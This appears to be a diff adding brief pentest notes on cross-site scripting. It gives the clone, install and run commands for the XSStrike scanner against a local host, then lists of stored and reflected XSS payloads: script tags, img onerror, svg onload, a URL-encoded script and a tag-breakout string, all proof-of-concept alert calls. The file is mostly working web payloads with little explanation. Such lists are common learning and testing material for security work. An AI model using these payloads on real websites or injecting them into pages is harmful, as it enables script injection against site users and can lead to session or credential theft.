@@ -1,0 +1,33 @@
+Download XSStrike - GitHub 
+git clone https://github.com/s0md3v/XSStrike
+cd XSStrike/
+pip3 install -r requirements.txt
+python3 xsstrike.py -u <local_host_ip> --crawl -l 4
+
+Now go to inspect element and search for the term given in vectors
+
+Or use burpsuite intercept the web request by typing text 
+
+
+Stored XSS
+
+<script>alert('Stored XSS');</script>
+<img src="x" onerror="alert('XSS')">
+<svg onload=alert('XSS')>
+<<script>alert('XSS')<</script>
+
+Reflected XSS
+
+<script>alert('Reflected XSS');</script>
+<img src="x" onerror="alert('Reflected XSS')">
+%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
+
+<script>var x="</script><script>alert('XSS')</script>";</script>
+
+
+
+
+
+
+
+
